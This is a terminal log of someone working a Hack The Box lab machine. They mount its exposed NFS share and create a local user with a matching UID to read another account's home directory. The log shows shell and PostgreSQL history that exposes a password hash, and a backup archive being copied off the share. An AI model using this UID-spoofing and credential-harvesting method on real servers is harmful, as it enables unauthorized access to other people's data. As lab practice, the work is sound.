
```
                                                                                                                              
┌──(fixit42㉿kali)-[~]
└─$ cd boxes                           
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes]
└─$ ls -la
total 48
drwxrwxr-x 12 fixit42 fixit42 4096 Mar 30  2025 .
drwx------ 42 fixit42 fixit42 4096 Oct 19 23:08 ..
drwxrwxr-x  3 fixit42 fixit42 4096 Jun 29  2024 ctflearn
drwxr-xr-x  4 fixit42 fixit42 4096 Feb 26  2024 hh
drwxr-xr-x 14 fixit42 fixit42 4096 Aug  2 21:18 htb
drwxrwxr-x  4 fixit42 fixit42 4096 Sep 27  2024 htb-a
drwxrwxr-x  4 fixit42 fixit42 4096 Jul  2  2024 otw
drwxrwxr-x  2 fixit42 fixit42 4096 Dec  9  2024 pentesterlab
drwxr-xr-x 48 fixit42 fixit42 4096 Aug 16 03:15 thm
drwxrwxr-x  3 fixit42 fixit42 4096 Mar 31  2025 undut2025
drwxrwxr-x  3 fixit42 fixit42 4096 Aug 19  2024 vulnhub
drwxr-xr-x  2 fixit42 fixit42 4096 Jun  8  2024 wsa
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes]
└─$ cd htb  
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb]
└─$ ls -la
total 56
drwxr-xr-x 14 fixit42 fixit42 4096 Aug  2 21:18 .
drwxrwxr-x 12 fixit42 fixit42 4096 Mar 30  2025 ..
drwxrwxr-x  7 fixit42 fixit42 4096 Aug 14 00:23 administrator
drwxrwxr-x  2 fixit42 fixit42 4096 Jul  4  2024 blurry
drwxr-xr-x  2 fixit42 fixit42 4096 Sep 25  2023 busqueda
drwxrwxr-x  2 fixit42 fixit42 4096 Aug  1 17:56 cicada
drwxr-xr-x  3 fixit42 fixit42 4096 Sep 28  2023 clicker
drwxr-xr-x  3 fixit42 fixit42 4096 Feb 22  2024 crafty
drwxrwxr-x  2 fixit42 fixit42 4096 Mar 30  2025 cypher
drwxrwxr-x  4 fixit42 fixit42 4096 Dec 20  2024 linkvortex
drwxrwxr-x  6 fixit42 fixit42 4096 Aug  2 21:21 montverde
drwxrwxr-x  2 fixit42 fixit42 4096 Jul 26 03:57 return
drwxr-xr-x  2 fixit42 fixit42 4096 Sep 25  2023 sandworm
drwxrwxr-x  2 fixit42 fixit42 4096 Mar 30  2025 titanic
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb]
└─$ mkdir slonik         
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb]
└─$ cd slonik  
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ mkdir mount 
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ mount 10.129.234.160   
mount: 10.129.234.160: can't find in /etc/fstab.
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ mount 10.129.234.160 ./mount
mount: /home/fixit42/boxes/htb/slonik/mount: must be superuser to use mount.
       dmesg(1) may have more information after failed mount system call.
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ sudo mount 10.129.234.160 ./mount
[sudo] password for fixit42: 
mount: /home/fixit42/boxes/htb/slonik/mount: fsconfig() failed: 10.129.234.160: Can't lookup blockdev.
       dmesg(1) may have more information after failed mount system call.
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ mount -h                    

Usage:
 mount [-lhV]
 mount -a [options]
 mount [options] [--source] <source> | [--target] <directory>
 mount [options] <source> <directory>
 mount <operation> <mountpoint> [<target>]

Mount a filesystem.

Options:
 -a, --all               mount all filesystems mentioned in fstab
 -c, --no-canonicalize   don't canonicalize paths
 -f, --fake              dry run; skip the mount(2) syscall
 -F, --fork              fork off for each device (use with -a)
 -T, --fstab <path>      alternative file to /etc/fstab
 -i, --internal-only     don't call the mount.<type> helpers
 -l, --show-labels       show also filesystem labels
     --map-groups <inner>:<outer>:<count>
                         add the specified GID map to an ID-mapped mount
     --map-users <inner>:<outer>:<count>
                         add the specified UID map to an ID-mapped mount
     --map-users /proc/<pid>/ns/user
                         specify the user namespace for an ID-mapped mount
 -m, --mkdir[=<mode>]    alias to '-o X-mount.mkdir[=<mode>]'
 -n, --no-mtab           don't write to /etc/mtab
     --options-mode <mode>
                         what to do with options loaded from fstab
     --options-source <source>
                         mount options source
     --options-source-force
                         force use of options from fstab/mtab
     --onlyonce          check if filesystem is already mounted
 -o, --options <list>    comma-separated list of mount options
 -O, --test-opts <list>  limit the set of filesystems (use with -a)
 -r, --read-only         mount the filesystem read-only (same as -o ro)
 -t, --types <list>      limit the set of filesystem types
     --source <src>      explicitly specifies source (path, label, uuid)
     --target <target>   explicitly specifies mountpoint
     --target-prefix <path>
                         specifies path used for all mountpoints
 -v, --verbose           say what is being done
 -w, --rw, --read-write  mount the filesystem read-write (default)
 -N, --namespace <ns>    perform mount in another namespace

 -h, --help              display this help
 -V, --version           display version

Source:
 -L, --label <label>     synonym for LABEL=<label>
 -U, --uuid <uuid>       synonym for UUID=<uuid>
 LABEL=<label>           specifies device by filesystem label
 UUID=<uuid>             specifies device by filesystem UUID
 PARTLABEL=<label>       specifies device by partition label
 PARTUUID=<uuid>         specifies device by partition UUID
 ID=<id>                 specifies device by udev hardware ID
 <device>                specifies device by path
 <directory>             mountpoint for bind mounts (see --bind/rbind)
 <file>                  regular file for loopdev setup

Operations:
 -B, --bind              mount a subtree somewhere else (same as -o bind)
 -M, --move              move a subtree to some other place
 -R, --rbind             mount a subtree and all submounts somewhere else
 --make-shared           mark a subtree as shared
 --make-slave            mark a subtree as slave
 --make-private          mark a subtree as private
 --make-unbindable       mark a subtree as unbindable
 --make-rshared          recursively mark a whole subtree as shared
 --make-rslave           recursively mark a whole subtree as slave
 --make-rprivate         recursively mark a whole subtree as private
 --make-runbindable      recursively mark a whole subtree as unbindable

For more details see mount(8).
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ sudo mount 10.129.234.160/ ./mount
mount: /home/fixit42/boxes/htb/slonik/mount: fsconfig() failed: 10.129.234.160/: Can't lookup blockdev.
       dmesg(1) may have more information after failed mount system call.
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ sudo mount -t nfs 10.129.234.160/ ./mount
mount.nfs: remote share not in 'host:dir' format
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ sudo mount -a -t nfs 10.129.234.160 ./mount
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ cd mount 
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ ls -la
total 8
drwxrwxr-x 2 fixit42 fixit42 4096 Oct 19 23:17 .
drwxrwxr-x 3 fixit42 fixit42 4096 Oct 19 23:17 ..
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ sudo mount -a -t nfs 10.129.234.160: .     
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ ls -la
total 8
drwxrwxr-x 2 fixit42 fixit42 4096 Oct 19 23:17 .
drwxrwxr-x 3 fixit42 fixit42 4096 Oct 19 23:17 ..
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ cd ..   
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ sudo mount -t nfs 10.129.234.160: ./mount 
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ ls -la mount                                 
total 16
drwxr-xr-x 19 root    root    4096 Sep 22 13:04 .
drwxrwxr-x  3 fixit42 fixit42 4096 Oct 19 23:17 ..
drwxr-xr-x  3 root    root    4096 Oct 24  2023 home
drwxr-xr-x 13 root    root    4096 Sep 19  2023 var
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik]
└─$ cd mount
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ cd home 
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ ls -la      
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-x---  5 1337 1337 4096 Sep 22 14:46 service
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ cd service 
cd: permission denied: service
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-x---  5 1337 1337 4096 Sep 22 14:46 service
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ cd ../var                    
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/var]
└─$ ls -la
total 12
drwxr-xr-x 13 root root 4096 Sep 19  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-xr-x  2 root root 4096 Oct 19 23:29 backups
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/var]
└─$ cd backups
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ ls -la
total 31928
drwxr-xr-x  2 root root    4096 Oct 19 23:29 .
drwxr-xr-x 13 root root    4096 Sep 19  2023 ..
-rw-r--r--  1 root root 4666454 Oct 19 23:23 archive-2025-10-19T2123.zip
-rw-r--r--  1 root root 4666445 Oct 19 23:24 archive-2025-10-19T2124.zip
-rw-r--r--  1 root root 4666455 Oct 19 23:25 archive-2025-10-19T2125.zip
-rw-r--r--  1 root root 4666448 Oct 19 23:26 archive-2025-10-19T2126.zip
-rw-r--r--  1 root root 4666453 Oct 19 23:27 archive-2025-10-19T2127.zip
-rw-r--r--  1 root root 4666455 Oct 19 23:28 archive-2025-10-19T2128.zip
-rw-r--r--  1 root root 4666452 Oct 19 23:29 archive-2025-10-19T2129.zip
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ sudo usermod -u 1337 1337                   
usermod: user '1337' does not exist
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ sudo useradd 1337        
useradd: invalid user name '1337': use --badname to ignore
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ sudo useradd 1337 --badname
useradd: WARNING: --badname is deprecated and will be removed
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ sudo usermod -u 1337 1337  
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ cat /etc/passwd                    
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
_galera:x:101:65534::/nonexistent:/usr/sbin/nologin
mysql:x:102:102:MariaDB Server,,,:/nonexistent:/bin/false
snort:x:103:103:Snort IDS:/var/log/snort:/usr/sbin/nologin
_sentrypeer:x:104:104::/var/lib/sentrypeer:/usr/sbin/nologin
cntlm:x:105:65534::/var/run/cntlm:/bin/sh
tss:x:106:105:TPM software stack,,,:/var/lib/tpm:/bin/false
strongswan:x:107:65534::/var/lib/strongswan:/usr/sbin/nologin
systemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologin
Debian-exim:x:108:106::/var/spool/exim4:/usr/sbin/nologin
uuidd:x:109:107::/run/uuidd:/usr/sbin/nologin
_gophish:x:110:109::/var/lib/gophish:/usr/sbin/nologin
freerad:x:111:110::/etc/freeradius:/usr/sbin/nologin
iodine:x:112:65534::/run/iodine:/usr/sbin/nologin
messagebus:x:113:111::/nonexistent:/usr/sbin/nologin
clamav:x:114:112::/var/lib/clamav:/bin/false
tcpdump:x:115:113::/nonexistent:/usr/sbin/nologin
miredo:x:116:65534::/var/run/miredo:/usr/sbin/nologin
_rpc:x:117:65534::/run/rpcbind:/usr/sbin/nologin
redis:x:118:116::/var/lib/redis:/usr/sbin/nologin
arpwatch:x:119:119:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
mosquitto:x:120:120::/var/lib/mosquitto:/usr/sbin/nologin
redsocks:x:121:121::/var/run/redsocks:/usr/sbin/nologin
stunnel4:x:991:991:stunnel service system account:/var/run/stunnel4:/usr/sbin/nologin
sshd:x:122:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
Debian-snmp:x:123:124::/var/lib/snmp:/bin/false
sslh:x:124:126::/nonexistent:/usr/sbin/nologin
freerad-wpe:x:125:127::/etc/freeradius-wpe:/usr/sbin/nologin
postgres:x:126:128:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
avahi:x:127:129:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
gpsd:x:128:20:GPSD system user,,,:/run/gpsd:/bin/false
nm-openvpn:x:129:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
_gvm:x:130:132::/var/lib/openvas:/usr/sbin/nologin
speech-dispatcher:x:131:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
usbmux:x:132:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
cups-pk-helper:x:133:133:user for cups-pk-helper service,,,:/nonexistent:/usr/sbin/nologin
inetsim:x:134:134::/var/lib/inetsim:/usr/sbin/nologin
nm-openconnect:x:135:136:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin
geoclue:x:136:137::/var/lib/geoclue:/usr/sbin/nologin
lightdm:x:137:138:Light Display Manager:/var/lib/lightdm:/bin/false
_defectdojo:x:138:139::/var/log/defectdojo:/usr/sbin/nologin
statd:x:139:65534::/var/lib/nfs:/usr/sbin/nologin
saned:x:140:141::/var/lib/saned:/usr/sbin/nologin
dradis:x:141:142::/var/lib/dradis:/usr/sbin/nologin
beef-xss:x:142:143::/var/lib/beef-xss:/usr/sbin/nologin
polkitd:x:988:988:User for polkitd:/:/usr/sbin/nologin
rtkit:x:143:144:RealtimeKit,,,:/proc:/usr/sbin/nologin
colord:x:144:145:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
_caldera:x:145:147::/var/lib/caldera:/usr/sbin/nologin
fixit42:x:1000:1000:fixit42,,,:/home/fixit42:/usr/bin/zsh
_bloodhound:x:146:149::/var/lib/bloodhound:/usr/sbin/nologin
pipewire:x:986:135:system user for pipewire:/nonexistent:/usr/sbin/nologin
1337:x:1337:1001::/home/1337:/bin/sh
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ su 1337                  
Password: 
su: Authentication failure
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ sudo su 1337             
$ ls -la
total 18248
drwxr-xr-x  2 root root    4096 Oct 19 23:36 .
drwxr-xr-x 13 root root    4096 Sep 19  2023 ..
-rw-r--r--  1 root root 4666449 Oct 19 23:33 archive-2025-10-19T2133.zip
-rw-r--r--  1 root root 4666448 Oct 19 23:34 archive-2025-10-19T2134.zip
-rw-r--r--  1 root root 4666455 Oct 19 23:35 archive-2025-10-19T2135.zip
-rw-r--r--  1 root root 4666469 Oct 19 23:36 archive-2025-10-19T2136.zip
$ cd ../..
sh: 2: cd: can't cd to ../..
$ ls -la
total 18248
drwxr-xr-x  2 root root    4096 Oct 19 23:36 .
drwxr-xr-x 13 root root    4096 Sep 19  2023 ..
-rw-r--r--  1 root root 4666449 Oct 19 23:33 archive-2025-10-19T2133.zip
-rw-r--r--  1 root root 4666448 Oct 19 23:34 archive-2025-10-19T2134.zip
-rw-r--r--  1 root root 4666455 Oct 19 23:35 archive-2025-10-19T2135.zip
-rw-r--r--  1 root root 4666469 Oct 19 23:36 archive-2025-10-19T2136.zip
$ cd ..
sh: 4: cd: can't cd to ..
$ cd ..
sh: 5: cd: can't cd to ..
$ exit
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/slonik/mount/var/backups]
└─$ cd ..          
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/var]
└─$ cd ..
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ ls -la
total 16
drwxr-xr-x 19 root    root    4096 Sep 22 13:04 .
drwxrwxr-x  3 fixit42 fixit42 4096 Oct 19 23:17 ..
drwxr-xr-x  3 root    root    4096 Oct 24  2023 home
drwxr-xr-x 13 root    root    4096 Sep 19  2023 var
                                                                                                                              
┌──(fixit42㉿kali)-[~/boxes/htb/slonik/mount]
└─$ cd home
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-x---  5 1337 1337 4096 Sep 22 14:46 service
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ sudo su 1337
$ cd service
sh: 1: cd: can't cd to service
$ bash
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-x---  5 1337 1337 4096 Sep 22 14:46 service
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home$ cd service
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ exit
exit
$ exit
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ sudo su 1337
$ bash
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home$ cd service
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ ls -la
total 40
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 .
drwxr-xr-x 3 root root 4096 Oct 24  2023 ..
-rw-r--r-- 1 1337 1337   90 Sep 22 14:46 .bash_history
-rw-r--r-- 1 1337 1337  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 1337 1337 3771 Oct 24  2023 .bashrc
drwx------ 2 1337 1337 4096 Oct 24  2023 .cache
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 .local
-rw-r--r-- 1 1337 1337  807 Oct 24  2023 .profile
-rw-r--r-- 1 1337 1337  326 Sep 22 14:46 .psql_history
drwxrwxr-x 2 1337 1337 4096 Oct 24  2023 .ssh
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cat .bash_history 
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cat .bash_logout 
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cat .psql_history 
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cd .cache
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.cache$ ls
motd.legal-displayed
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.cache$ cat motd.legal-displayed 
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.cache$ ls -la
total 8
drwx------ 2 1337 1337 4096 Oct 24  2023 .
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 ..
-rw-r--r-- 1 1337 1337    0 Oct 24  2023 motd.legal-displayed
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.cache$ cd ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ ls -la
total 40
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 .
drwxr-xr-x 3 root root 4096 Oct 24  2023 ..
-rw-r--r-- 1 1337 1337   90 Sep 22 14:46 .bash_history
-rw-r--r-- 1 1337 1337  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 1337 1337 3771 Oct 24  2023 .bashrc
drwx------ 2 1337 1337 4096 Oct 24  2023 .cache
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 .local
-rw-r--r-- 1 1337 1337  807 Oct 24  2023 .profile
-rw-r--r-- 1 1337 1337  326 Sep 22 14:46 .psql_history
drwxrwxr-x 2 1337 1337 4096 Oct 24  2023 .ssh
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cd -local
bash: cd: -l: invalid option
cd: usage: cd [-L|[-P [-e]]] [-@] [dir]
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ ls -la
total 40
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 .
drwxr-xr-x 3 root root 4096 Oct 24  2023 ..
-rw-r--r-- 1 1337 1337   90 Sep 22 14:46 .bash_history
-rw-r--r-- 1 1337 1337  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 1337 1337 3771 Oct 24  2023 .bashrc
drwx------ 2 1337 1337 4096 Oct 24  2023 .cache
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 .local
-rw-r--r-- 1 1337 1337  807 Oct 24  2023 .profile
-rw-r--r-- 1 1337 1337  326 Sep 22 14:46 .psql_history
drwxrwxr-x 2 1337 1337 4096 Oct 24  2023 .ssh
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cd .local
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local$ ls -la
total 12
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 .
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 ..
drwx------ 3 1337 1337 4096 Oct 24  2023 share
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local$ cd share
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local/share$ ls -la
total 12
drwx------ 3 1337 1337 4096 Oct 24  2023 .
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 ..
drwx------ 2 1337 1337 4096 Oct 24  2023 nano
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local/share$ cd nano
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local/share/nano$ ls -la
total 8
drwx------ 2 1337 1337 4096 Oct 24  2023 .
drwx------ 3 1337 1337 4096 Oct 24  2023 ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.local/share/nano$ cd ../../..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ ls -la
total 40
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 .
drwxr-xr-x 3 root root 4096 Oct 24  2023 ..
-rw-r--r-- 1 1337 1337   90 Sep 22 14:46 .bash_history
-rw-r--r-- 1 1337 1337  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 1337 1337 3771 Oct 24  2023 .bashrc
drwx------ 2 1337 1337 4096 Oct 24  2023 .cache
drwxrwxr-x 3 1337 1337 4096 Oct 24  2023 .local
-rw-r--r-- 1 1337 1337  807 Oct 24  2023 .profile
-rw-r--r-- 1 1337 1337  326 Sep 22 14:46 .psql_history
drwxrwxr-x 2 1337 1337 4096 Oct 24  2023 .ssh
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service$ cd .ssh
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.ssh$ ls -la
total 16
drwxrwxr-x 2 1337 1337 4096 Oct 24  2023 .
drwxr-x--- 5 1337 1337 4096 Sep 22 14:46 ..
-rw------- 1 1337 1337   96 Oct 24  2023 authorized_keys
-rw-r--r-- 1 1337 1337   96 Oct 24  2023 id_ed25519.pub
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.ssh$ echo 1 > txt
bash: txt: Read-only file system
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home/service/.ssh$ cd ../..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/home$ cd ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount$ ls -la
total 16
drwxr-xr-x 19 root    root    4096 Sep 22 13:04 .
drwxrwxr-x  3 fixit42 fixit42 4096 Oct 19 23:17 ..
drwxr-xr-x  3 root    root    4096 Oct 24  2023 home
drwxr-xr-x 13 root    root    4096 Sep 19  2023 var
1337@kali:/home/fixit42/boxes/htb/slonik/mount$ cd var
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var$ ls -la
total 12
drwxr-xr-x 13 root root 4096 Sep 19  2023 .
drwxr-xr-x 19 root root 4096 Sep 22 13:04 ..
drwxr-xr-x  2 root root 4096 Oct 19 23:45 backups
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var$ cd backups
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls -la
total 13688
drwxr-xr-x  2 root root    4096 Oct 19 23:45 .
drwxr-xr-x 13 root root    4096 Sep 19  2023 ..
-rw-r--r--  1 root root 4666453 Oct 19 23:43 archive-2025-10-19T2143.zip
-rw-r--r--  1 root root 4666466 Oct 19 23:44 archive-2025-10-19T2144.zip
-rw-r--r--  1 root root 4666455 Oct 19 23:45 archive-2025-10-19T2145.zip
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls -la

total 8
drwxr-xr-x  2 root root 4096 Oct 19 23:52 .
drwxr-xr-x 13 root root 4096 Sep 19  2023 ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ 
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Oct 19 23:52 .
drwxr-xr-x 13 root root 4096 Sep 19  2023 ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2145.zip ../../..
cp: cannot stat 'archive-2025-10-19T2145.zip': No such file or directory
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cd ..
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var$ ls
backups
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var$ cd backups
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls
archive-2025-10-19T2153.zip
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip ../../../.
cp: cannot create regular file '../../.././archive-2025-10-19T2153.zip': Permission denied
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip ~/boxes/htb/slonik
cp: cannot create regular file '/home/1337/boxes/htb/slonik': No such file or directory
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip ~/boxes/htb/slonik/
cp: cannot create regular file '/home/1337/boxes/htb/slonik/': No such file or directory
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip ~/boxes/htb/slonik/zip.zip
cp: cannot create regular file '/home/1337/boxes/htb/slonik/zip.zip': No such file or directory
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ ls
archive-2025-10-19T2153.zip  archive-2025-10-19T2154.zip
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip ~
cp: cannot create regular file '/home/1337': Permission denied
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ cp archive-2025-10-19T2153.zip /tmp/
1337@kali:/home/fixit42/boxes/htb/slonik/mount/var/backups$ exit
exit
$ exit
                                                                                                                              
┌──(fixit42㉿kali)-[~/…/htb/slonik/mount/home]
└─$ cd /tmp
                                                                                                                              
┌──(fixit42㉿kali)-[/tmp]
└─$ ls -la
total 4572
drwxrwxrwt 17 root    root        420 Oct 19 23:56 .
drwxr-xr-x 19 root    root       4096 Oct 19 00:22 ..
-rw-r--r--  1 1337    1337    4666449 Oct 19 23:55 archive-2025-10-19T2153.zip
-rw-------  1 fixit42 fixit42       0 Oct 19 22:43 config-err-rsLRqy
drwxrwxrwt  2 root    root         40 Oct 19 22:43 .font-unix
drwxrwxrwt  2 root    root         60 Oct 19 22:43 .ICE-unix
drwx------  2 fixit42 fixit42      60 Oct 19 22:43 ssh-euyQTJZtuyoK
